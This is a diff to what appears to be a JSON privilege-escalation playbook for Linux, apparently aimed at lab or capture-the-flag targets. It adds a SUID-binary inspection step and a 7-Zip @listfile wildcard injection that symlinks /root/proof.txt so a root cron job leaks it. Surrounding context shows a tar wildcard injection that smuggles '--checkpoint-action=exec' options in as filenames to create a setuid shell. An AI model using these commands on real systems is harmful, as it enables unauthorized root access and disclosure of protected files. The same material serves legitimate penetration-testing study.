@@ -412,6 +412,11 @@
           "tool": "sh",
           "run": "find / -perm -g=s -o -perm -u=s -type f 2>/dev/null | xargs ls -la",
           "note": "SUID and SGID together with ownership shown. SGID on notable groups matters (adm → read /var/log, shadow → crack root)."
+        },
+        {
+          "tool": "sh",
+          "run": "ls -la {{suid_bin}} && strings -n 6 {{suid_bin}} | head -n 40",
+          "note": "Inspect a non-standard SUID binary for GTFOBins upstream applet signatures, relative command calls open to PATH hijacking, or writable library paths."
         }
       ]
     },
@@ -524,6 +529,11 @@
           "tool": "sh",
           "run": "cd /writable/backup/dir && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh' && echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' > shell.sh",
           "note": "Tar wildcard injection: filenames that double as options. When root's tar -cf ... * runs, your checkpoint fires. The same idea applies to rsync (--rsh) and chown (--reference)."
+        },
+        {
+          "tool": "sh",
+          "run": "ln -sf /root/proof.txt leak.zip && touch '@leak.zip'",
+          "note": "7-Zip / 7za wildcard @listfile file-read injection: when a privileged cron task runs 7za a ... * inside a writable directory, @leak.zip causes 7-Zip to read the symlink target as a listfile and emit its lines in diagnostic warnings."
         }
       ]
     },
